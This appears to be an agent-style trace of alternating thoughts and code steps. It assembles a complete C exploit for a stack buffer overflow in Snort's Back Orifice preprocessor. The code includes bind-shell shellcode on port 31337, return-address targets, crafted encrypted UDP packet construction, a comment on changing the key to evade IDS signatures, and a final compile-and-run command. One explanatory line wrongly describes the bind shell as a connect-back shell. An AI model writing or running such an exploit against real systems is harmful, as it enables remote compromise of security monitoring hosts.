[
    {
        "type": "thought",
        "content": "The vulnerability exists in the spp_bo.c file of Snort's Back Orifice preprocessor (BoGetDirection function), where insufficient bounds checking leads to a stack-based buffer overflow when handling crafted UDP packets.The exploit aims to send a specially crafted UDP packet to a vulnerable Snort instance to trigger this buffer overflow and gain remote code execution.\n\nShellcode: The exploit includes shellcode (assembly instructions) that will be executed once the buffer overflow is triggered. The provided shellcode is a bind shell on port 31337, which establishes a connection back to the attacker's machine."
    },
    {
        "type": "execution",
        "content": "unsigned char x86_lnx_bind[] =\n\"\\x31\\xdb\\x53\\x43\\x53\\x6a\\x02\\x6a\\x66\\x58\\x99\\x89\\xe1\\xcd\\x80\\x96\"\n\"\\x43\\x52\\x66\\x68\\x7a\\x69\\x66\\x53\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x56\"\n\"\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xd1\\xe3\\xcd\\x80\\x52\\x52\\x56\\x43\\x89\\xe1\"\n\"\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\"\n\"\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\"\n\"\\x89\\xe1\\xcd\\x80\";"
    },
    {
        "type": "thought",
        "content": "Targets: The script defines different targets (t_target structures) based on how Snort was compiled (-O0 for no optimization or -O2 for some optimization). Each target specifies:\n\nShellcode details.\nReturn address offsets.\nBuffer sizes and offsets crucial for exploiting the vulnerability.\n"
    },
    {
        "type": "execution",
        "content": "typedef struct {\n\tchar \t\t*desc;\t\t// description\n\tunsigned char\t*scode;\t\t// shellcode\n\tunsigned int\tscode_len;\t\n\tunsigned long\tretaddr;\t// return address\n\tunsigned int\ti_var_off;\t// offset from buf1 to variable 'i'\n\tunsigned int\tlen_var_off;\t// offset from buf1 to variable 'len'\n\tunsigned int    ret_off;\t// offset from buf1 to saved eip\n\tunsigned int\tdatasize; \t// value of size field in BO ping packet\n} t_target;\n\nt_target targets[] = {\n\t{\n\t\"manual testing gcc with -O0\",\n\tx86_lnx_bind, sizeof(x86_lnx_bind),\n\t//0x0804aa07, \n\t0x4008f000+0x16143,\t// pop/ret in libc\n\t1024+1+32, 1024+1+44, 1024+1+60,\n\t0xFFFFFFFF\n\t},\n\t{\n\t\"manual testing gcc with -O2\",\n\tx86_lnx_bind, sizeof(x86_lnx_bind),\n\t0x0804aa07, //0xbfffe9e0 \n\t1024+1+8, 1024+1+20, 1024+1+44,\n\t1048+4+24\n\t},\n\t{ NULL, NULL, 0, 0, 0, 0, 0, 0 }\n};"
    },
    {
        "type": "thought",
        "content": "Buffer Overflow Construction: The explbuild function constructs the malicious UDP packet (buff) with:\n\nBO protocol headers.\nData size fields (IVAL and LVAL).\nEncrypted shellcode payload and necessary offsets (i_var_off, len_var_off, ret_off)."
    },
    {
        "type": "execution",
        "content": "#define PACKETSIZE 1400\t\n#define OVERFLOW_BUFFSZ 1024\n#define IVAL 0x11223344;\n#define LVAL 0x11223354+16;\n\n#define ARGSIZE 256\n#define PORT 53\n#define MAGICSTRING \"*!*QWTY?\"\n#define MAGICSTRINGLEN 8\n#define TYPE_PING 0x01\n\nstatic long holdrand = 1L;\nchar g_password[ARGSIZE];\nint port = PORT;\n\n/* \n * borrowed some code from BO client\n */\nvoid  msrand (unsigned int seed )\n{\n\tholdrand = (long)seed;\n}\n\nint mrand ( void)\n{ \n\treturn(((holdrand = holdrand * 214013L + 2531011L) >> 16) & 0x7fff);\n}\n\nunsigned int getkey()\n{\n\tint x, y;\n\tunsigned int z;\n\n\ty = strlen(g_password);\n\tif (!y)\n\t\treturn 31337;\n\telse {\n\t\tz = 0;\n\t\tfor (x = 0; x < y; x++)\n\t\tz+= g_password[x];\n    \n\t\tfor (x = 0; x < y; x++) {\n\t\t\tif (x%2)\n\t\t\t\tz-= g_password[x] * (y-x+1);\n\t\t\telse\n\t\t\t\tz+= g_password[x] * (y-x+1);\n\t\t\tz = z%RAND_MAX;\n      \t\t}\n\t\t\n\t\tz = (z * y)%RAND_MAX;\n    \t\treturn z;\n  \t}\n}\n\nvoid BOcrypt(unsigned char *buff, int len)\n{\n\tint y;\n  \n\tif (!len)\n\t\treturn;\n  \n\tmsrand(getkey());\n\tfor (y = 0; y < len; y++)\n\t\tbuff[y] = buff[y] ^ (mrand()%256);\n}\n\nvoid explbuild(unsigned char *buff, t_target *t)\n{\n\tunsigned char *ptr;\n\tunsigned long *pdw;\n\tunsigned long size;\n\tunsigned char   *scode;\t\n        unsigned int    scode_len;\n        unsigned long   retaddr;\n\tunsigned int    i_var_off;\n\tunsigned int    len_var_off;\n\tunsigned int    ret_off;\n\tunsigned int    datasize;\n\n\tscode = t->scode;\n\tscode_len = t->scode_len;\n\tretaddr = t->retaddr;\n\ti_var_off = t->i_var_off;\n\tlen_var_off = t->len_var_off;\n\tret_off = t->ret_off;\n\tdatasize = t->datasize;\n\n\tmemset(buff, 0x90, PACKETSIZE); \n\tbuff[PACKETSIZE - 1] = 0;\n\t\n\tstrcpy(buff, MAGICSTRING);\n \n\tpdw = (unsigned long *)(buff + MAGICSTRINGLEN);\n    \t*pdw++ = datasize;\n      \t*pdw++ = (unsigned long)-1;\n         ptr = (unsigned char *)pdw;\n\t*ptr++ = TYPE_PING;\n\n\tsize = IVAL;\n\tmemcpy(buff + i_var_off, &size, 4);\n\tsize = LVAL;\n\tmemcpy(buff + len_var_off, &size, 4); \n\n\tmemcpy(buff + ret_off, &retaddr, 4);\n\n\t/* you may want to place shellcode on encrypted part and will\n\t * be decrypted into buf1 by BoGetDirection\n\t */\n\t// memcpy(buff + OVERFLOW_BUFFSZ - scode_len - 128, \n\t//\t\t(char *) scode, scode_len);\n\n\tmemcpy(buff + PACKETSIZE - scode_len - 1, (char *)scode, scode_len);\n\n\t/* you may want to set NULL byte to stop the loop here, but it \n\t * won't work with pop/ret method\n\t */\n\t// buff[ret_off + 4] = 0;\n\n  \tsize = ret_off + 4;\n  \tBOcrypt(buff, (int)size);\n}"
    },
    {
        "type": "thought",
        "content": "Sending the Packet: The sendping function sends the crafted UDP packet to the target Snort instance."
    },
    {
        "type": "execution",
        "content": "int sendping(unsigned long dest, int port, int sock, unsigned char *buff)\n{\n\tstruct sockaddr_in host;\n\tint i, size;\n\tfd_set fdset;\n\tstruct timeval tv;\n\t\n\tsize=PACKETSIZE;\n\thost.sin_family = AF_INET;\n\thost.sin_port = htons((u_short)port);\n\thost.sin_addr.s_addr = dest;\n  \n\tFD_ZERO(&fdset);\n\tFD_SET(sock, &fdset);\n\ttv.tv_sec = 10;\n\ttv.tv_usec = 0;\n\n\ti = select(sock+1, NULL, &fdset, NULL, &tv);\n\tif (i == 0) {\n\t\tprintf(\"Timeout\\n\");\n\t\treturn(1);\n\t} else if (i < 0) {\n\t\tperror(\"select: \");\n\t\treturn(1);\n\t}\n\n\tif ( (sendto(sock, buff, size, 0, \n\t\t(struct sockaddr *)&host, sizeof(host))) != size ) {\n\t\tperror(\"sendto: \");\n\t\treturn(1);\n\t}\n\n\treturn 0;\n}\n\nint main(int argc, char **argv)\n{\n\tstruct in_addr hostin;\n\tunsigned long dest;\n\tchar buff[PACKETSIZE];\n\tint ntarget;\n   \n\tprintf(\"Snort BackOrifice PING exploit (version \"VERSION\")\\n\"\n\t\t\"by rd@thc.org\\n\\n\");\n\n\tif (argc < 3 || ((ntarget = atoi(argv[2])) <= 0) ) {\n\t\tusage(argv[0]);\n\t\treturn 0;\n\t}\n\n\tif (ntarget >= (sizeof(targets) / sizeof(t_target))) {\n\t\tprintf (\"WARNING: target out of list. list:\\n\\n\");\n\t\tusage(argv[0]);\n\t\treturn 0;\n\t}\t\t\t\t\t\n\n\tntarget = ntarget - 1;\n\n\t// change the key here to avoid the detection of a simple \n\t// packet matching IDS signature.\n\tg_password[0] = 0;\n\n\tif ( (dest = inet_addr(argv[1])) == (unsigned long)-1)\n\t\tprintf(\"Bad IP: '%s'\\n\", argv[1]);\n\telse {\n\t\tint s;\n\t\thostin.s_addr = dest;\n\t\ts=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);\n\n\t\tprintf(\"Selected target:\\n%3d | %s\\n\", ntarget+1, \n\t\t\t\ttargets[ntarget].desc);\n\t\texplbuild(buff, &targets[ntarget]);\n\n\t\tprintf(\"\\nSending exploit to %s\\n\", inet_ntoa(hostin));\n\t\tif (sendping(dest, port, s, buff))\n\t\t\tprintf(\"Sending exploit failed for dest %s\\n\", \n\t\t\t\t\tinet_ntoa(hostin));\n\t\tprintf(\"Done.\\n\");\n\t}\n\n\treturn 0;\n}"
    },
    {
        "type": "thought",
        "content": "Then compile the program and execute it."
    },
    {
        "type": "execution",
        "content": "gcc -o exp exp.c && ./exp 127.0.0.1 2"
    }
]